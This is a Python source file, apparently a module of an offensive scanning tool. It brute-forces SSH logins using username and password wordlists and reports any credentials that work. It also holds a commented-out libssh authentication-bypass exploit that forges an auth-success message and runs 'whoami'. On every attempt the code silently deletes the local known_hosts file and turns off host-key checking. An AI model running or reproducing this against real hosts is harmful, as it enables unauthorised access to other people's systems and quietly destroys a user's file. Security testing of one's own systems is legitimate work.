# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-02 22:05
from core.data import gLogger
from core.utils.informationprovider import InformationProvider
import os
import asyncssh

# import paramiko as paramiko
# import socket
# from asyncssh import SSHClientConnection, SSHClientConnectionOptions
# from asyncssh.connection import _connect, _open_tunnel, _open_proxy
# from asyncssh.misc import async_context_manager

# async def check_rce(addr):
#     try:
#         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#         sock.settimeout(5)
#         loop = asyncio.get_event_loop()
#         await loop.sock_connect(sock, (addr.split(':')[0], int(addr.split(':')[1])))
#         message = paramiko.message.Message()
#         transport = paramiko.transport.Transport(sock)
#         transport.start_client()
#         message.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
#         transport._send_message(message)
#         spawncmd = transport.open_session(timeout=6)
#         spawncmd.exec_command('whoami')
#         if spawncmd.recv_exit_status() == 0:
#             gLogger.myscan_info('Target maybe libssh bypass, {}'.format(addr))
#     except Exception:
#         pass


async def check_weak_password(addr, ssh_up_list):
    # 抑制 asyncssh logger
    asyncssh.set_log_level('CRITICAL')
    for username, password in ssh_up_list:
        try:
            known_hosts_path = os.path.join(os.path.expanduser('~'), '.ssh', 'known_hosts')
            if os.path.exists(known_hosts_path):
                os.remove(known_hosts_path)
            async with asyncssh.connect(host=addr.split(':')[0], port=int(addr.split(':')[1]), username=username, password=password, known_hosts=None) as connction:
                gLogger.myscan_info('target maybe ssh weak pass, {}'.format(str(addr) + ' | ' + str(username) + '/' + str(password)))
                return {'name': 'weakpass', 'url': str(addr) + ' | ' + str(username) + '/' + str(password), 'software': 'ssh'}
        except Exception:
            pass


async def ssh_scan(addr):
    vul_list = []
    ssh_username_list = InformationProvider.read_file('ssh_usernames.txt')
    ssh_password_list = InformationProvider.read_file('ssh_passwords.txt')
    ssh_up_list = InformationProvider.generate(ssh_username_list, ssh_password_list)
    b = await check_weak_password(addr, ssh_up_list)
    if b is not None:
        vul_list.append(b)
    return vul_list


if __name__ == '__main__':
    import asyncio
    loop = asyncio.get_event_loop()
    loop.run_until_complete(ssh_scan('xxxx'))
